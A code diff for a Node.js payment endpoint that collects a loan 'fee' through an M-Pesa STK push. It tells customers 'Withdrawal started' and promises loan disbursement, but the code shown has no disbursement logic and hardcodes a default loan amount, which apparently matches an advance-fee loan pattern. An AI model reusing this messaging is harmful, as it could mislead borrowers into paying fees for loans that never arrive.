@@ -40,7 +40,8 @@ function formatPhone(phone) {
 }
 
 // 1ï¸âƒ£ Initiate Payment
-app.post("/pay", async (req, res) => {
+     
+ app.post("/pay", async (req, res) => {
   try {
     const { phone, amount, loan_amount } = req.body;
     const formattedPhone = formatPhone(phone);
@@ -59,7 +60,7 @@ app.post("/pay", async (req, res) => {
       phone_number: formattedPhone,
       external_reference: reference,
       customer_name: "Customer",
-      callback_url: "https://swift-loan-refunding.onrender.com/callback",
+      callback_url: "https://swiftfee.onrender.com/callback",
       channel_id: "000119"
     };
 
@@ -73,39 +74,33 @@ app.post("/pay", async (req, res) => {
 
     console.log("SwiftWallet response:", resp.data);
 
+    let receipts = readReceipts();
+
     if (resp.data.success) {
-      // Save PENDING receipt
       const receiptData = {
         reference,
         transaction_id: resp.data.transaction_id || null,
         transaction_code: null,
         amount: Math.round(amount),
-        loan_amount: existingReceipt.loan_amount || "50000",
+        loan_amount: loan_amount || "50000",
         phone: formattedPhone,
         customer_name: "N/A",
         status: "pending",
-        status_note: `STK push  sent to ${formattedPhone}. Please enter your M-Pesa PIN to complete the fee payment and loan disbursement.Withdrawal started..... `,
+        status_note: `STK push sent to ${formattedPhone}. Please enter your M-Pesa PIN to complete the fee payment and loan disbursement. Withdrawal started...`,
         timestamp: new Date().toISOString()
       };
 
-      let receipts = readReceipts();
       receipts[reference] = receiptData;
       writeReceipts(receipts);
 
-      res.json({
-        success: true,
-        message: "STK push sent, check your phone",
-        reference,
-        receipt: receiptData
-      });
+      res.json({ success: true, message: "STK push sent, check your phone", reference, receipt: receiptData });
     } else {
-      // Handle failed STK push
       const failedReceiptData = {
         reference,
         transaction_id: resp.data.transaction_id || null,
         transaction_code: null,
         amount: Math.round(amount),
-        loan_amount: existingReceipt.loan_amount || "50000",
+        loan_amount: loan_amount || "50000",
         phone: formattedPhone,
         customer_name: "N/A",
         status: "stk_failed",
@@ -113,22 +108,13 @@ app.post("/pay", async (req, res) => {
         timestamp: new Date().toISOString()
       };
 
-      let receipts = readReceipts();
       receipts[reference] = failedReceiptData;
       writeReceipts(receipts);
 
-      res.status(400).json({
-        success: false,
-        error: resp.data.error || "Failed to initiate payment",
-        receipt: failedReceiptData
-      });
+      res.status(400).json({ success: false, error: resp.data.error || "Failed to initiate payment", receipt: failedReceiptData });
     }
   } catch (err) {
-    console.error("Payment initiation error:", {
-      message: err.message,
-      status: err.response?.status,
-      data: err.response?.data
-    });
+    console.error("Payment initiation error:", { message: err.message, status: err.response?.status, data: err.response?.data });
 
     const reference = "ORDER-" + Date.now();
     const { phone, amount, loan_amount } = req.body;
@@ -139,7 +125,7 @@ app.post("/pay", async (req, res) => {
       transaction_id: null,
       transaction_code: null,
       amount: amount ? Math.round(amount) : null,
-      loan_amount: existingReceipt.loan_amount || "50000",
+      loan_amount: loan_amount || "50000",
       phone: formattedPhone,
       customer_name: "N/A",
       status: "error",
@@ -151,11 +137,7 @@ app.post("/pay", async (req, res) => {
     receipts[reference] = errorReceiptData;
     writeReceipts(receipts);
 
-    res.status(500).json({
-      success: false,
-      error: err.response?.data?.error || err.message || "Server error",
-      receipt: errorReceiptData
-    });
+    res.status(500).json({ success: false, error: err.response?.data?.error || err.message || "Server error", receipt: errorReceiptData });
   }
 });
 
